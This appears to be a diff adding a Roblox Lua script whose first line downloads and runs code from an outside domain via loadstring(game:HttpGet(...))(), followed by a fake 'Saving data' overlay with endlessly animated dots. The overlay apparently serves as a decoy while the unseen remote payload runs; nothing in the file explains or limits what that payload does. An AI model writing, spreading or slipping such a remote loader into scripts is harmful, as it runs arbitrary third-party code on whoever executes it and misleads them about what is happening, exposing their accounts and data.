@@ -1,0 +1,44 @@
+loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
+
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame for the background
+local backgroundFrame = Instance.new("Frame")
+backgroundFrame.Size = UDim2.new(0, 320, 0, 70)  -- Set size of the background frame
+backgroundFrame.Position = UDim2.new(0.5, -160, 0.5, -35)  -- Center it on the screen
+backgroundFrame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black color
+backgroundFrame.BackgroundTransparency = 0.5  -- Slightly transparent
+backgroundFrame.BorderSizePixel = 0  -- No border
+backgroundFrame.Parent = screenGui
+
+-- Create a TextLabel for displaying the saving message
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 1, 0)  -- Fill the background frame
+textLabel.Position = UDim2.new(0, 0, 0, 0)  -- Position at the top-left of the frame
+textLabel.Text = "Saving data"
+textLabel.TextColor3 = Color3.new(1, 1, 1)  -- White color for text
+textLabel.BackgroundTransparency = 1  -- Transparent background
+textLabel.Font = Enum.Font.SourceSans
+textLabel.TextSize = 24
+textLabel.Parent = backgroundFrame
+
+-- Set rounded corners for the background frame
+local uiCorner = Instance.new("UICorner")
+uiCorner.Parent = backgroundFrame
+uiCorner.CornerRadius = UDim.new(0, 12)  -- Adjust the corner radius as needed
+
+-- Function to animate the dots
+local function animateDots()
+    while true do
+        for i = 1, 3 do
+            textLabel.Text = "Saving data" .. string.rep(".", i)  -- Add dots up to 3
+            wait(0.5)  -- Wait for half a second
+        end
+        textLabel.Text = "Saving data"  -- Reset to original text
+    end
+end
+
+-- Start the animation
+animateDots()
